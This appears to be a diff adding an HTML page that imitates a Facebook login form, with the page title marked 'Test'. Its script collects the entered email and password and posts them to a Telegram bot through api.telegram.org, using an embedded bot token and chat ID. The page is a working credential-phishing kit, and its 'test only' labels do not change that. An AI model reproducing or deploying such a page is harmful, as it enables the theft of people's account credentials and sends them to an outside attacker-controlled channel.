@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Login - Test</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 300px;
+    }
+    h2 {
+      text-align: center;
+      color: #1877f2;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #165ecc;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Facebook Login</h2>
+    <input type="text" id="email" placeholder="Email or Phone" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="sendToBot()">Log In</button>
+  </div>
+
+  <script>
+    async function sendToBot() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Replace these with your Telegram bot token and chat ID
+      const botToken = "8497867526:AAF5spXffZPnK2knH-cDWWM1S0io9Gdmsm8"; // e.g., 123456789:AAExampleToken
+      const chatId = "7831958199";     // e.g., 123456789
+
+      const message = `🧪 Test Login:\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+        alert("✅ Sent to Telegram (test only)");
+      } catch (error) {
+        alert("❌ Error sending message to Telegram");
+        console.error(error);
+      }
+    }
+  </script>
+</body>
+</html>
